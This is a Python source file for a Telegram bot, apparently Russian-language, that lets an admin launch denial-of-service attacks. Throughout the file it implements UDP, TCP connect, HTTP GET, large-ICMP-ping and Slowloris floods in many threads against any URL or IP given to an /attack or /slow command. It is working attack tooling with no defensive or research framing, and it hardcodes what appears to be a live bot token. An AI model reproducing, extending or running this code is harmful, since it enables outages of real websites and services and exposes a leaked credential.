#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import asyncio
import logging
import random
import socket
import subprocess
import time
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message
import aiohttp

BOT_TOKEN = "8567035620:AAFUD3gY3IXyqQz0aPrhA3AY7ZPJC5PT4Pw"
ADMIN_ID = 8343382233

DEFAULT_DURATION = 60
THREADS = 30
PROXY_LIST = []  # можно загрузить из файла

class MegaCannon:
    def __init__(self):
        self.active = False
        self.executor = ThreadPoolExecutor(max_workers=100)

    async def udp_flood(self, ip, port, duration, threads, proxy=None):
        end = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if proxy:
            # здесь можно настроить прокси для UDP (сложно, но возможно через raw socket)
            pass
        def _send():
            while self.active and time.time() < end:
                try:
                    payload = random._urandom(1024)
                    sock.sendto(payload, (ip, port))
                except:
                    pass
        tasks = [asyncio.get_event_loop().run_in_executor(self.executor, _send) for _ in range(threads)]
        await asyncio.gather(*tasks)

    async def tcp_syn(self, ip, port, duration, threads):
        end = time.time() + duration
        def _send():
            while self.active and time.time() < end:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((ip, port))
                    s.send(b"SYN")
                    s.close()
                except:
                    pass
        tasks = [asyncio.get_event_loop().run_in_executor(self.executor, _send) for _ in range(threads)]
        await asyncio.gather(*tasks)

    async def http_flood(self, url, duration, threads):
        end = time.time() + duration
        headers = [
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"},
            {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)"}
        ]
        async def _send(session):
            while self.active and time.time() < end:
                try:
                    async with session.get(url, headers=random.choice(headers), timeout=1) as resp:
                        await resp.read()
                except:
                    pass
        async with aiohttp.ClientSession() as session:
            tasks = [_send(session) for _ in range(threads)]
            await asyncio.gather(*tasks)

    async def icmp_flood(self, ip, duration, threads):
        end = time.time() + duration
        def _ping():
            while self.active and time.time() < end:
                try:
                    subprocess.call(["ping", "-c", "1", "-s", "65500", ip],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    pass
        tasks = [asyncio.get_event_loop().run_in_executor(self.executor, _ping) for _ in range(threads)]
        await asyncio.gather(*tasks)

    # Новый метод: Slowloris (медленный HTTP)
    async def slowloris(self, url, duration, threads):
        end = time.time() + duration
        async def _slow(session):
            while self.active and time.time() < end:
                try:
                    async with session.get(url, headers={"Connection": "keep-alive"}, timeout=2) as resp:
                        await asyncio.sleep(10)  # держим соединение открытым
                except:
                    pass
        async with aiohttp.ClientSession() as session:
            tasks = [_slow(session) for _ in range(threads)]
            await asyncio.gather(*tasks)

    def stop(self):
        self.active = False

def parse_target(text):
    text = text.strip()
    if text.startswith(("http://", "https://")):
        parsed = urlparse(text)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        return host, port, text
    if ":" in text:
        parts = text.split(":")
        if len(parts) == 2 and parts[0].replace(".", "").isdigit() and parts[1].isdigit():
            return parts[0], int(parts[1]), None
    if text.replace(".", "").isdigit():
        return text, 80, None
    return None, None, None

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
cannon = MegaCannon()
current_task = None

@dp.message(Command("start"))
async def start_cmd(message: Message):
    await message.answer("🚀 MegaCannon готов. Команды: /attack, /stop, /status, /slow <url>")

@dp.message(Command("attack"))
async def attack_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещён.")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("⚠️ Укажи цель: /attack https://example.com или /attack 8.8.8.8:53")
        return
    target_str = args[1]
    ip, port, url = parse_target(target_str)
    if ip is None:
        await message.answer("❌ Неверный формат")
        return
    global current_task
    if current_task and not current_task.done():
        await message.answer("⚠️ Атака уже идёт. Используй /stop")
        return
    cannon.active = True
    await message.answer(f"🎯 Цель: {ip}:{port} (URL: {url or 'нет'})\n🔄 Запускаю все методы...")
    async def run_all():
        methods = []
        if url:
            methods.append(("HTTP GET", cannon.http_flood(url, DEFAULT_DURATION, THREADS)))
            methods.append(("Slowloris", cannon.slowloris(url, DEFAULT_DURATION, THREADS//2)))
        else:
            methods.append(("UDP", cannon.udp_flood(ip, port or 53, DEFAULT_DURATION, THREADS)))
            methods.append(("TCP SYN", cannon.tcp_syn(ip, port or 80, DEFAULT_DURATION, THREADS)))
            methods.append(("ICMP", cannon.icmp_flood(ip, DEFAULT_DURATION, THREADS)))
        for name, coro in methods:
            if not cannon.active:
                break
            await message.answer(f"⚡ Запуск {name}... (на {DEFAULT_DURATION} сек)")
            await coro
            await message.answer(f"✅ {name} завершён.")
        await message.answer("🏁 Все атаки завершены.")
    current_task = asyncio.create_task(run_all())
    await current_task

@dp.message(Command("slow"))
async def slow_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещён.")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("⚠️ Укажи URL: /slow https://example.com")
        return
    url = args[1]
    global current_task
    if current_task and not current_task.done():
        await message.answer("⚠️ Атака уже идёт.")
        return
    cannon.active = True
    await message.answer(f"🐢 Slowloris на {url}...")
    current_task = asyncio.create_task(cannon.slowloris(url, DEFAULT_DURATION, THREADS//2))
    await current_task
    await message.answer("✅ Slowloris завершён.")

@dp.message(Command("stop"))
async def stop_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещён.")
        return
    cannon.stop()
    global current_task
    if current_task:
        current_task.cancel()
        current_task = None
    await message.answer("⏹ Все атаки остановлены.")

@dp.message(Command("status"))
async def status_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещён.")
        return
    status = "Активна" if cannon.active else "Неактивна"
    await message.answer(f"🔹 Статус: {status}")

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
